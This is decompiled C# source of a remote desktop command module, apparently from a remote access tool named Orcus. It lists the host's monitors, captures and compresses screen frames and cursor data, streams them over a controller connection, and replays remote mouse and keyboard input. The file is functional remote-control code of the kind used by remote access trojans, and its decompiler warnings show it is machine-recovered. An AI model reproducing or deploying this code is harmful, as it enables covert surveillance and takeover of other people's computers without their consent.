using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Orcus.Commands.ConnectionInitializer;
using Orcus.Commands.RemoteDesktop.Capture;
using Orcus.Commands.RemoteDesktop.Capture.DesktopDuplication;
using Orcus.Commands.RemoteDesktop.Capture.FrontBuffer;
using Orcus.Commands.RemoteDesktop.Capture.GDI;
using Orcus.Commands.RemoteDesktop.Compression;
using Orcus.Plugins;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities.Compression;
using Orcus.Utilities;

namespace Orcus.Commands.RemoteDesktop;

[DisallowMultipleThreads]
public class RemoteDesktopCommand : Command
{
	private readonly Dictionary<CaptureType, Func<IScreenCaptureService>> _screenCaptureServices;

	private readonly object _streamComponentsLock = new object();

	private IConnection _connection;

	private IConnectionInfo _connectionInfo;

	private bool _isStreaming;

	private IScreenCaptureService _screenCaptureService;

	private CursorStreamCodec _cursorStreamCodec;

	private ImageCompressionType _compressionType;

	private IImageCompression _currentImageCompression;

	private IStreamCodec _unsafeCodec;

	private int _currentMonitor;

	private readonly RemoteActions _remoteActions;

	private bool _drawCursor;

	public RemoteDesktopCommand()
	{
		_screenCaptureServices = new Dictionary<CaptureType, Func<IScreenCaptureService>>
		{
			{
				(CaptureType)4,
				() => new GdiService()
			},
			{
				(CaptureType)2,
				() => new FrontBufferService()
			},
			{
				(CaptureType)1,
				() => new DesktopDuplicationService()
			}
		};
		_remoteActions = new RemoteActions();
	}

	public override void Dispose()
	{
		((Command)this).Dispose();
		bool isStreaming = _isStreaming;
		_isStreaming = false;
		lock (_streamComponentsLock)
		{
			if (!isStreaming)
			{
				((IDisposable)_connection)?.Dispose();
				_screenCaptureService?.Dispose();
			}
			CursorStreamCodec cursorStreamCodec = _cursorStreamCodec;
			if (cursorStreamCodec != null)
			{
				cursorStreamCodec.Dispose();
			}
			((IDisposable)_currentImageCompression)?.Dispose();
		}
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected I4, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d3: Expected O, but got Unknown
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected O, but got Unknown
		RemoteDesktopCommunication val = (RemoteDesktopCommunication)parameter[0];
		switch ((int)val)
		{
		case 0:
		{
			RemoteDesktopInformation val2 = new RemoteDesktopInformation();
			val2.set_Screens(new List<ScreenInfo>());
			RemoteDesktopInformation val3 = val2;
			Screen[] allScreens = Screen.get_AllScreens();
			string[] array = ScreenExtensions.GetAllMonitorsFriendlyNames().ToArray();
			for (int i = 0; i < allScreens.Length; i++)
			{
				List<ScreenInfo> screens = val3.get_Screens();
				ScreenInfo val4 = new ScreenInfo();
				val4.set_Number(i);
				val4.set_Width(allScreens[i].get_Bounds().Width);
				val4.set_Height(allScreens[i].get_Bounds().Height);
				val4.set_Name((array.Length < i || string.IsNullOrEmpty(array[i])) ? allScreens[i].get_DeviceName() : array[i]);
				screens.Add(val4);
			}
			foreach (KeyValuePair<CaptureType, Func<IScreenCaptureService>> screenCaptureService in _screenCaptureServices)
			{
				if (screenCaptureService.Value().IsSupported)
				{
					val3.set_AvailableCaptureTypes((CaptureType)(val3.get_AvailableCaptureTypes() | screenCaptureService.Key));
				}
			}
			((Command)this).ResponseBytes((byte)3, new Serializer(typeof(RemoteDesktopInformation)).Serialize((object)val3), connectionInfo);
			break;
		}
		case 1:
			if (!_isStreaming)
			{
				_connectionInfo = connectionInfo;
				_isStreaming = true;
				Thread thread = new Thread(Streaming);
				thread.IsBackground = true;
				thread.Start();
			}
			break;
		case 2:
			_isStreaming = false;
			lock (_streamComponentsLock)
			{
				break;
			}
		case 4:
		{
			CaptureType captureType = (CaptureType)parameter[1];
			int num = parameter[2];
			int quality = parameter[3];
			bool drawCursor = parameter[4] == 1;
			ImageCompressionType compressionType = (ImageCompressionType)parameter[5];
			lock (_streamComponentsLock)
			{
				InitializeStreamingComponents(captureType, num, quality, connectionInfo, drawCursor, compressionType);
				break;
			}
		}
		case 5:
		{
			Guid guid = new Guid(parameter.Skip(1).Take(16).ToArray());
			((IDisposable)_connection)?.Dispose();
			_connection = connectionInfo.get_ConnectionInitializer().TakeConnection(guid);
			break;
		}
		case 6:
			_connection = (IConnection)(object)new ServerConnection(connectionInfo, (Command)(object)this, 7);
			break;
		case 8:
		{
			int num2 = parameter[1];
			lock (_streamComponentsLock)
			{
				if (_unsafeCodec.get_ImageQuality() != num2)
				{
					_unsafeCodec.set_ImageQuality(num2);
				}
				break;
			}
		}
		case 11:
		{
			int num = parameter[1];
			lock (_streamComponentsLock)
			{
				_screenCaptureService.ChangeMonitor(num);
				((IDisposable)_unsafeCodec)?.Dispose();
				_unsafeCodec = (IStreamCodec)new UnsafeStreamCodec(GetImageCompression(_compressionType), (UnsafeStreamCodecParameters)3);
				_currentMonitor = num;
				break;
			}
		}
		case 12:
			DoDesktopAction((RemoteDesktopAction)parameter[1], parameter, 2);
			break;
		case 13:
			lock (_streamComponentsLock)
			{
				if (parameter[1] == 1)
				{
					_drawCursor = true;
					_cursorStreamCodec = new CursorStreamCodec();
					break;
				}
				CursorStreamCodec cursorStreamCodec = _cursorStreamCodec;
				if (cursorStreamCodec != null)
				{
					cursorStreamCodec.Dispose();
				}
				_drawCursor = false;
				break;
			}
		case 3:
		case 7:
		case 9:
		case 10:
			break;
		}
	}

	public void Streaming()
	{
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		byte[] cursorData = null;
		IConnection connection = _connection;
		try
		{
			using (_screenCaptureService)
			{
				CursorStreamCodec cursorStreamCodec = _cursorStreamCodec;
				try
				{
					while (_isStreaming)
					{
						lock (_streamComponentsLock)
						{
							for (int i = 0; i < 10; i++)
							{
								if (!_isStreaming)
								{
									return;
								}
								RemoteDesktopDataInfo data = _screenCaptureService.CaptureScreen(_unsafeCodec, (ICursorStreamCodec)(object)_cursorStreamCodec, _drawCursor);
								if (data == null)
								{
									continue;
								}
								int num = 2 + data.get_Length();
								ScreenResponseFlags flags = (ScreenResponseFlags)1;
								if (_drawCursor && _cursorStreamCodec != null)
								{
									cursorData = _cursorStreamCodec.CodeCursor();
									num += cursorData.Length + 4;
									flags = (ScreenResponseFlags)(flags | 2);
								}
								try
								{
									if (_connection.get_SupportsStream())
									{
										_connection.SendStream(new WriterCall(num, (Action<BinaryWriter>)delegate(BinaryWriter writer)
										{
											//IL_0002: Unknown result type (might be due to invalid IL or missing references)
											writer.Write((byte)flags);
											if (_drawCursor && cursorData != null)
											{
												writer.Write(cursorData.Length);
												writer.Write(cursorData);
											}
											writer.Write((byte)_currentMonitor);
											data.WriteIntoStream(writer.BaseStream);
										}));
										continue;
									}
									byte[] array = new byte[num];
									array[0] = (byte)flags;
									int num2 = 1;
									if (_drawCursor && cursorData != null)
									{
										Buffer.BlockCopy(BitConverter.GetBytes(cursorData.Length), 0, array, num2, 4);
										Buffer.BlockCopy(cursorData, 0, array, num2 + 4, cursorData.Length);
										num2 += cursorData.Length + 4;
									}
									array[num2] = (byte)_currentMonitor;
									data.WriteToBuffer(array, num2 + 1);
									_connection.SendData(array, 0, array.Length);
								}
								catch (Exception)
								{
									if (!_isStreaming)
									{
										return;
									}
									((Command)this).ResponseByte((byte)14, _connectionInfo);
								}
							}
						}
					}
				}
				finally
				{
					((IDisposable)cursorStreamCodec)?.Dispose();
				}
			}
		}
		finally
		{
			((IDisposable)connection)?.Dispose();
		}
	}

	private void InitializeStreamingComponents(CaptureType captureType, int monitor, int quality, IConnectionInfo connectionInfo, bool drawCursor, ImageCompressionType compressionType)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		IScreenCaptureService screenCaptureService = _screenCaptureService;
		_screenCaptureService = _screenCaptureServices[captureType]();
		try
		{
			_screenCaptureService.Initialize(monitor);
		}
		catch (Exception ex)
		{
			_screenCaptureService = screenCaptureService;
			((Command)this).ResponseBytes((byte)9, Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
			return;
		}
		screenCaptureService?.Dispose();
		((IDisposable)_unsafeCodec)?.Dispose();
		CursorStreamCodec cursorStreamCodec = _cursorStreamCodec;
		if (cursorStreamCodec != null)
		{
			cursorStreamCodec.Dispose();
		}
		_unsafeCodec = (IStreamCodec)new UnsafeStreamCodec(GetImageCompression(compressionType), (UnsafeStreamCodecParameters)3);
		_currentImageCompression.set_Quality(quality);
		if (drawCursor)
		{
			_cursorStreamCodec = new CursorStreamCodec();
		}
		_compressionType = compressionType;
		_currentMonitor = monitor;
		_drawCursor = drawCursor;
		((Command)this).ResponseByte((byte)10, connectionInfo);
	}

	private IImageCompression GetImageCompression(ImageCompressionType compressionType)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected I4, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0059: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_008a: Expected O, but got Unknown
		if (_compressionType == compressionType && _currentImageCompression != null)
		{
			return _currentImageCompression;
		}
		((IDisposable)_currentImageCompression)?.Dispose();
		_compressionType = compressionType;
		switch (compressionType - 1)
		{
		case 0:
		{
			JpgCompression val2 = new JpgCompression(70);
			IImageCompression result = (IImageCompression)val2;
			_currentImageCompression = (IImageCompression)val2;
			return result;
		}
		case 1:
			return _currentImageCompression = (IImageCompression)(object)new TurboJpgImageCompression(decompress: false);
		default:
			throw new ArgumentOutOfRangeException("compressionType", compressionType, null);
		case 3:
		{
			NoCompression val = new NoCompression();
			IImageCompression result = (IImageCompression)val;
			_currentImageCompression = (IImageCompression)val;
			return result;
		}
		}
	}

	private void DoDesktopAction(RemoteDesktopAction remoteDesktopAction, byte[] data, int index)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Invalid comparison between Unknown and I4
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if ((int)remoteDesktopAction != 0)
		{
			if ((int)remoteDesktopAction != 1)
			{
				throw new ArgumentOutOfRangeException("remoteDesktopAction", remoteDesktopAction, null);
			}
			short scanCode = BitConverter.ToInt16(data, index + 1);
			_remoteActions.DoKeyboardAction((RemoteDesktopKeyboardAction)data[index], scanCode);
		}
		else
		{
			int x = BitConverter.ToInt32(data, index + 1);
			int y = BitConverter.ToInt32(data, index + 5);
			int extraData = BitConverter.ToInt32(data, index + 9);
			_remoteActions.DoMouseAction((RemoteDesktopMouseAction)data[index], x, y, extraData, _currentMonitor);
		}
	}

	protected override uint GetId()
	{
		return 14u;
	}
}
